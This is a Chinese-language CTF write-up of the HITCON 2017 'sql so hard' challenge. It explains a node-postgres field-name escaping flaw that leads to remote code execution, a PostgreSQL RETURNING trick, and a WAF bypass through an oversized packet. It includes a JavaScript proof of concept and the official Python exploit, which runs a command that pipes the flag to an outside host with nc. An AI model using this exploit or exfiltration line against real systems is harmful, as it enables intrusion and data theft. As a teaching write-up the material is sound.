# sql so hard

> 分类：Web

## 题目描述

Node.js + MySQL + PostgreSQL 的注入题。利用 node-postgres 字段名转义不完全导致命令执行（RCE）。

## 考察知识点

- node-postgres 字段名转义不完全 RCE
- PostgreSQL RETURNING 语法
- WAF 绕过（超长数据包触发 max_allowed_packet 报错）

## 解法

**漏洞原理**（详见 P神分析 https://paper.seebug.org/438/ ）：

node-postgres 执行查询后返回字段名，node 后端把字段名做不完整转义（只转义单引号，不转义反斜杠）后拼接进 `Function` 类。传入 `\'` 会变成 `\\'`，单引号逃逸，导致代码执行：

```javascript
sql = `SELECT 1 AS "\\'+console.log(process.env)]=null;//"`
// 生成：this['\\'+console.log(process.env)]=null;//'] = rowData[0] == null ? null : parsers[0](rowData[0]);
```

**题目绕过点**：
1. 注入点在 username，但按分号 `;` 分割，无法多语句执行 → 用 PostgreSQL 的 `RETURNING` 语法让 INSERT 返回结果（类似 SELECT）。
2. WAF 过滤了 `\`、`/`、`*`、空格等 → 构造 payload 用反斜杠时，通过构造超长数据包（超过 16M，触发 `max_allowed_packet`）让 insert 报错，从而绕过黑名单判断。

**利用细节**：
- 单双引号不能正常用，用 ES6 反引号
- Function 环境无 require，用 `process.mainModule.constructor._load` 代替
- 一个 fieldName 只有 64 位，用多个 fieldName 拼接

官方 exp：

```python
payload = """','')/*%s*/returning(1)as"\\'/*",(1)as"\\'*/-(a=`child_process`)/*",(2)as"\\'*/-(b=`/readflag|nc orange.tw 12345`)/*",(3)as"\\'*/-console.log(process.mainModule.require(a).exec(b))]=1//"--""" % (' '*1024*1024*16)

username = str(randint(1,65535))*3
data = {'username': username+payload, 'password': 'AAAAAA'}
r = requests.post('http://target:31337/reg', data=data)
```

## 参考答案

（flag 通过 RCE 反弹 shell 后读取）

## 来源

- 作者：LoRexxar / Orange | https://lorexxar.cn/2017/11/10/hitcon2017-writeup/
- 漏洞分析：https://paper.seebug.org/438/
